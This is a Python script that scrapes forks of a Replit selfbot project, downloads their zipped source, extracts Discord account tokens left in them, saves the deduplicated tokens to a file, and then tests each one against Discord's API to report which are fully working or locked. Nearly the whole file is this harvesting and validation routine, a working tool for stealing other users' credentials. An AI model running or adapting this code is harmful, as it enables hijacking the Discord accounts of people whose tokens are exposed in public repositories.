from genericpath import isfile
import os
import uvloop
from resources import Design
import asyncio
from resources import ReplIt, RequestMaker
from aioconsole import aprint
import aiohttp
import ujson




async def main():
    if os.path.isfile("./false_tokens.txt"):
        os.remove("./false_tokens.txt")

    if os.path.isfile("./tokens.txt"):
        os.remove("./tokens.txt")

    repl = ReplIt()
    await Design.ascii()
    id = await repl.get_id("/@W1zz3d/Venom-Selfbot-2021-New-Selfbot")
    urls, ids = await repl.get_forks(id)
    await aprint(len(urls))
    full = []

    for url, id in zip(urls, ids):
        await repl.get_zip(url, id)
        tokens = await repl.search_zip(id)
        full += tokens


    for token in full:
        await aprint(token)
    with open('./false_tokens.txt', 'a+') as f:
        for token in full:
            f.write(f"{token}\n")

    lines_seen = set()
    outfile = open("tokens.txt", "w")
    for line in open("false_tokens.txt", "r"):
        if line not in lines_seen:
            outfile.write(line)
            lines_seen.add(line)
    outfile.close()




def check():
    tokens = open('tokens.txt', 'r').read().splitlines()

    rm = RequestMaker(headers={'content-type':'application/json', 'user-agent':'Mozilla/5.0 (X11; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0'}, connector=aiohttp.TCPConnector(ssl=False, keepalive_timeout=10000, limit=50, limit_per_host=50), trust_env=False, skip_auto_headers=None, json_serialize=ujson.dumps, auto_decompress=True)
    with rm:
        resp = rm.request_pool_sync([{"method":"get", "url":"https://discord.com/api/v9/users/@me/library", "headers":{"authorization":f"{token}"}}for token in tokens])

    for index, status in enumerate(rm.response_pool_status_sync(resp)):
        if status == 200:
            print(f"Token number {index+1} is fully working!")
        elif status == 403:
            print(f"Token number {index+1} is account locked in some way")
        elif status == 429:
            print(f"Token number {index+1} check was incomplete, ratelimited")
        elif status == 401:
            print(f"Token number {index+1} is invalid!")
        else:
            print(f"Black magic occurred -- {status} -- {index+1}")





if __name__ == "__main__":
    asyncio.run(main())
    check() # Why the fuck doesn't this run afterwards?
